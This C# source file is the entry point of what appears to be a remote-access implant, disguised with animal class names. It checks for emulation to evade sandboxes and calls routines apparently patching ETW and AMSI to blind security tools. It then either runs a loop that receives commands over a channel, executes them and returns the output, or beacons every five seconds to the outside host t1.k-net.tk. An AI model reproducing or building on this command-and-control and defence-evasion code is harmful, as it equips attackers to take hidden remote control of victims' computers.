using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Text;
using System.Diagnostics;
using System.Threading;



namespace AnimalZoo {
    public class Elephant
    {
        private static bool doAntEating = false;

        private static string OwlOrZebra = "Zebra";
        
        static void Main(string[] args)
        {
            Console.WriteLine("__");
            System.Diagnostics.Debug.WriteLine("___");

            if (Chameleon.CheckEmulated())
                return;

            Chameleon.PatchETT();
            Chameleon.PatchAM();

            if (doAntEating)
            {
                Anteater.EatAnts();
            }
            else
            {

                if (OwlOrZebra == "Owl")
                {
                    Owl owlChannel = new Owl(true);
                    if (!owlChannel.Connect())
                    {
                        return;
                    }


                    string lastOwlCmmd = "";
                    do
                    {
                        string owlCmmd = owlChannel.receiveCommand();
                        if (owlCmmd == null)
                        {
                            break;
                        }
                        lastOwlCmmd = owlCmmd.Trim();

                        string output = Shark.exec(owlCmmd);
                        if (output == null)
                        {
                            break;
                        }
                        if (!owlChannel.respondWith(output))
                        {
                            break;
                        }
                    } while (lastOwlCmmd != "exit");
                }
                else // Use a Zebra Channel
                {
                    Zebra zebraChannel = new Zebra("t1.k-net.tk");
                    zebraChannel.sendHello();

                    while (zebraChannel.running)
                    {
                        // Sleepy Zebra
                        Thread.Sleep(5000);

                        bool newC = zebraChannel.getUpdate();

                    }
                }
            }
        }
    }
}
